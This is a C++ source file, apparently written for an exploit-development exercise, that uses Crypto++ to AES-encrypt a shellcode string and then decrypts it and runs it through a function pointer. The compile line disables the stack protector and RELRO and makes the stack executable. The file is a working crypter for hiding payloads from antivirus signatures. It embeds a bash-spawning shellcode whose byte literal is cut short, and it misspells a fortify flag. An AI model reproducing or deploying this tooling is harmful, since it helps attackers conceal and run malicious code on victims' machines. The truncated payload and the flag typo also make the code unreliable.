/**
Author: Javier Tejedor
Crypter Shellcode

This program encrypts a shellcode using AES encryption alghoritm

Compile the program using this command:
gcc -fno-stack-protector -D_FORTY_SOURCE=0 -z norelro -z execstack -o main main.cpp -lcryptopp

Install the libraries to use cryptopp:
sudo apt-get install libcrypto++-dev libcrypto++-doc libcrypto++-utils
**/

#include <iostream>
#include <iomanip>
#include <sstream>

// Crypto to use AES
#include "cryptopp/modes.h"
#include "cryptopp/aes.h"
#include "cryptopp/filters.h"

using namespace std;

void setKeys(byte[], byte[], int, int);
void printShellcodeEncrypted(string);
void executeDecryptShellcode(string);
string encryptShellcode(byte[], byte[], string);
string decryptShellcode(byte[], byte[], string);

int main(int argc, char* argv[])
{
    //sets the key and the iv
    byte key[ CryptoPP::AES::DEFAULT_KEYLENGTH ];
    byte iv[ CryptoPP::AES::BLOCKSIZE ];

    //modify this to put your own key and iv
    int keyAES  = 0x1234;
    int ivAES   = 0x5678;

    //if you want to encrypt, fill the "toEncryptShellcode" and leave empty "toDecryptShellcode"
    //if you want to dencrypt, fill the "toDecryptShellcode" and leave empty "toEncryptShellcode"
    string toEncryptShellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x5";
    string toDecryptShellcode = "";

    setKeys(key, iv, keyAES, ivAES);

    //encrypt part
    if(toEncryptShellcode.compare("") != 0){
        //Encrypt
        string encryptedShellcode = encryptShellcode(key, iv, toEncryptShellcode);
        
        //prints the shellcode encrypted
        printShellcodeEncrypted(encryptedShellcode);
    }

    //decrypt part
    if(toDecryptShellcode.compare("") != 0){
        //Decrypt
        string decryptedShellcode = decryptShellcode(key, iv, toDecryptShellcode);

        //Executes the shellcode
        executeDecryptShellcode(decryptedShellcode);
    }

    return 0;
}
/**
    set memory for key and iv
**/
void setKeys(byte key[], byte iv[], int keyInt, int ivInt){
    memset( key, keyInt, CryptoPP::AES::DEFAULT_KEYLENGTH );
    memset( iv, ivInt, CryptoPP::AES::BLOCKSIZE );
}

/**
    encrypts the shellcode
**/
string encryptShellcode(byte key[], byte iv[], string inputShellcode){
    string encryptedText;
    CryptoPP::AES::Encryption aesEncryption(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption( aesEncryption, iv );

    CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::StringSink( encryptedText ) );
    stfEncryptor.Put( reinterpret_cast<const unsigned char*>( inputShellcode.c_str() ), inputShellcode.length() + 1 );
    stfEncryptor.MessageEnd();

    return encryptedText;
}

/**
    decrypts the shellcode
**/
string decryptShellcode(byte key[], byte iv[], string encryptedShellcode){
    string decryptedShellcode;
    CryptoPP::AES::Decryption aesDecryption(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
    CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption( aesDecryption, iv );

    CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink( decryptedShellcode ) );
    stfDecryptor.Put( reinterpret_cast<const unsigned char*>( encryptedShellcode.c_str() ), encryptedShellcode.size() );
    stfDecryptor.MessageEnd();

    return decryptedShellcode;
}

/**
    prints formated the shellcode encrypted
**/
void printShellcodeEncrypted(string encryptedShellcode){
    stringstream stream;
    string result;

    for( int i = 0; i < encryptedShellcode.size(); i++ ) {

        stream << "\\x" << hex << (0xFF & static_cast<byte>(encryptedShellcode[i]));
        result = stream.str();
    }

    cout << "Encoded Shellcode size (" << result.size() << " bytes)" << endl;
    cout << "\"" << result << "\"" << endl;
}

/**
    executes the shellcode
**/
void executeDecryptShellcode(string shellcode){
    char code[shellcode.size()];

    strcpy(code, shellcode.c_str());

    int (*ret)() = (int(*)())code;
    ret();
}
